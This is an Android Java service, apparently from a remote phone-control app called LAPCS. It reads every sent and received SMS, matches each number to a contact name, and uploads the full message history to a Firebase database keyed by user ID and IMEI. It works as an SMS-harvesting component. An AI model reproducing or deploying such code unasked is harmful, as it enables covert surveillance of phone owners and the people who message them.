package com.example.lapcs.services;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;

public class getMessages extends IntentService {
    DatabaseReference mDatabase;
    SharedPreferences sharedPreferences;
    SharedPreferences.Editor editor;
    public getMessages() {
        super("getMessages");
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        mDatabase = FirebaseDatabase.getInstance().getReference();
        sharedPreferences = getSharedPreferences("MyData", Context.MODE_PRIVATE);
        editor=sharedPreferences.edit();
        final String Imei = sharedPreferences.getString("Imei", "");
        final String userID = sharedPreferences.getString("UserID", "");
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms"), new String[]{"address","date","body","type"}, null, null, null);
        String messages="";
        if (cursor.moveToFirst()) {
            do
            {
                String address=cursor.getString(0);
                String date=cursor.getString(1);
                Date msgDayTime = new Date(Long.valueOf(date));
                SimpleDateFormat outputFormat = new SimpleDateFormat("dd-MMM-yyyy h:mm a");
                String dateTime=outputFormat.format(msgDayTime);
                String message=cursor.getString(2);
                String type=cursor.getString(3);
                String name=getContactName(this, address.toString());
                if(name != null)
                {
                    if(type.equalsIgnoreCase("1"))
                        messages=messages+" Received Name: "+name+" Number: "+address+" Body: "+message+" Date: "+dateTime+"//LAPCS//";
                    else if(type.equalsIgnoreCase("2"))
                        messages=messages+" Sent Name: "+name+" Number: "+address+" Body: "+message+" Date: "+dateTime+"//LAPCS//";
                }
                else
                {
                    if(type.equalsIgnoreCase("1"))
                        messages=messages+" Received Name: Unknown Number: "+address+" Body: "+message+" Date: "+dateTime+"//LAPCS//";
                    else if(type.equalsIgnoreCase("2"))
                        messages=messages+" Sent Name: Unknown Number: "+address+" Body: "+message+" Date: "+dateTime+"//LAPCS//";
                }
            }
            while (cursor.moveToNext());
        }
        mDatabase.child("Users").child(userID).child(Imei).child("getMessages").setValue("NA");
        mDatabase.child("Users").child(userID).child(Imei).child("getMessages").setValue("//LAPCS//requestSMS//LAPCS//"+messages);
    }
    public String getContactName(Context context, String phoneNumber) {
        ContentResolver cr = context.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                Uri.encode(phoneNumber));
        Cursor cursor = cr.query(uri,
                new String[] { ContactsContract.PhoneLookup.DISPLAY_NAME }, null, null, null);
        if (cursor == null) {
            return null;
        }
        String contactName = null;
        if (cursor.moveToFirst()) {
            contactName = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
        }
        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }
        return contactName;
    }
}
